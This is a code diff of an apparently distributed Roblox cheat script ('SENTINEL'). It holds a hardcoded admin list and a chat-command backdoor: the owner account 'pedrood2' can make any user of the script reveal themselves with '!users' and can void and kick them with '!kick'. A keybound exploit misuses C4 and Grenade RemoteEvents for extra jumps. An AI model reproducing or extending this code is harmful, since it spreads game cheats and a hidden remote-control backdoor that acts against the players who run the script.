@@ -16,12 +16,12 @@ local StarterGui = game:GetService("StarterGui")
 
 local sigma = {
     "pedrood2", 
-    "ii_dino122",
-    "iAmLegitTrust_p",
+    "iidino122",
+	"iAmLegitTrust_p",
     "Milaneso202_xd"
 }
 
-local alpha = "users"
+local alpha = "!users"
 
 -- Verify is user is admin ong
 local function admins(name)
@@ -61,7 +61,7 @@ Workspace[player.Name]:FindFirstChild("Right Arm"):Destroy()
 wait(0.2)
 Workspace[player.Name]:FindFirstChild("Left Arm"):Destroy()
     -- Deletes all players parts (perm void)
-    wait(0.2)
+    wait()
   
     targetPlayer:Kick("You were kicked by Dev/Admin.") -- Dynamic kick to more faster
 
@@ -86,7 +86,7 @@ local function onChatMessage(player, message)
     -- ignore owner username on users command
     if message:lower() == alpha:lower() and player.Name:lower() ~= "pedrood2" then
         local args = {
-            [1] = ">>> HII!",
+            [1] = ">>> I'M USING SENTINEL v8.2.1z!<<<",
             [2] = "All"
         }
         game:GetService("ReplicatedStorage")
@@ -96,7 +96,7 @@ local function onChatMessage(player, message)
     end
 
     -- Owner only can kick players
-    if message:sub(1, 5):lower() == ":kick" and player.Name:lower() == "pedrood2" then
+    if message:sub(1, 5):lower() == "!kick" and player.Name:lower() == "pedrood2" then
         local partialName = message:sub(7):lower()
         local targetPlayer = findPlayerByName(partialName)
         if targetPlayer then
@@ -1070,92 +1070,59 @@ window:Bind("Quick Triple Jump",{location = Table, flag = "KeyBindb", default = 
 local Mouse = game.Players.LocalPlayer:GetMouse()
 game:GetService("UserInputService").InputBegan:Connect(function(Input, IsTyping)
 if IsTyping then return end
-if Input.KeyCode == Enum.KeyCode.B then
+if Input.KeyCode == (Table["KeyBindb"])then
 wait()
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local mouse = LocalPlayer:GetMouse()
-
-local hasDoubleJumped = false
-
--- Script inicial que reproduce la animación JumpAnim
-local function playJumpAnimation()
-    -- Encuentra el personaje en Workspace
-    local character = game:GetService("Workspace"):FindFirstChild("pedrood2")
-    if character then
-        -- Busca el objeto Animate
-        local animateScript = character:FindFirstChild("Animate")
-        if animateScript then
-            -- Busca la animación JumpAnim
-            local jumpAnim = animateScript.jump:FindFirstChild("JumpAnim")
-            if jumpAnim and jumpAnim:IsA("Animation") then
-                -- Asegúrate de que exista un Animator en el personaje
-                local humanoid = character:FindFirstChildOfClass("Humanoid")
-                if humanoid then
-                    local animator = humanoid:FindFirstChildOfClass("Animator")
-                    if not animator then
-                        animator = Instance.new("Animator")
-                        animator.Parent = humanoid
-                    end
-                    
-                    -- Cargar y reproducir la animación
-                    local animationTrack = animator:LoadAnimation(jumpAnim)
-                    animationTrack:Play()
-                    print("")
-                else
-                    warn("No se encontró un Humanoid en el personaje.")
+    local Players = game:GetService("Players")
+    local UserInputService = game:GetService("UserInputService")
+    local LocalPlayer = Players.LocalPlayer
+    
+    local plrs = game:GetService'Players'
+    local plr = plrs.LocalPlayer
+    local mouse = plr:GetMouse()
+    
+    local hasDoubleJumped = false
+    
+    local function performDoubleJump()
+        local character = LocalPlayer.Character
+        local humanoid = character and character:FindFirstChildOfClass('Humanoid')
+        
+        if humanoid and not hasDoubleJumped then
+            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+            wait()
+    
+            for _,v in next,plr.Backpack:GetChildren() do
+                if v.Name == 'C4' and v:FindFirstChild'RemoteEvent' then
+                    v.Parent = plr.Character
+                    wait()
+                    humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                    wait(0.1)
+                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                    v.RemoteEvent:FireServer(mouse.Hit.LookVector)
+                    v.Parent = plr.Backpack
                 end
-            else
-                warn("JumpAnim no es una instancia válida de Animation.")
             end
-        else
-            warn("No se encontró el script Animate en el personaje.")
-        end
-    else
-        warn("No se encontró el personaje pedrood2 en Workspace.")
-    end
-end
-
-local function performDoubleJump()
-    -- Ejecuta la animación al inicio
-    playJumpAnimation()
-
-    local character = LocalPlayer.Character
-    local humanoid = character and character:FindFirstChildOfClass('Humanoid')
-
-    if humanoid and not hasDoubleJumped then
-        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
-        wait()
-
-        -- Manejo de C4
-        for _, v in ipairs(LocalPlayer.Backpack:GetChildren()) do
-            if v.Name == 'C4' and v:FindFirstChild('RemoteEvent') then
-                LocalPlayer.Character.Humanoid:EquipTool(v) -- Equipar antes de usar
-                wait(0.1)
-                v.RemoteEvent:FireServer(mouse.Hit.LookVector)
-                wait(0.2)
-                tpToPlayer("C4 Model") -- Teletransportar la C4 al jugador
-                v.Parent = LocalPlayer.Backpack
+    
+            wait(0.2)
+    
+            for _,v in next,plr.Backpack:GetChildren() do
+                if v.Name == 'Grenade' and v:FindFirstChild'RemoteEvent' then
+                    v.Parent = plr.Character
+                    humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                    wait(0.1)
+                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping) 
+					wait()                               
+                    humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
+                    wait(0.1)
+                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping) 
+				    v:Activate()
+                    v.Parent = plr.Backpack
+                end
             end
-        end
-
-        wait(0.1)
-
-        -- Manejo de Grenade
-        for _, v in ipairs(LocalPlayer.Backpack:GetChildren()) do
-            if v.Name == 'Grenade' then
-                LocalPlayer.Character.Humanoid:EquipTool(v) -- Equipar la granada
-                wait(0.1)
-                v:Activate()
-                wait(0.2)
-                tpToPlayer("Grenade Model") -- Teletransportar la granada al jugador
-                v.Parent = LocalPlayer.Backpack
-            end
-        end
 
         hasDoubleJumped = true
     end
-end
+end    
+
 performDoubleJump()
 end
 end)
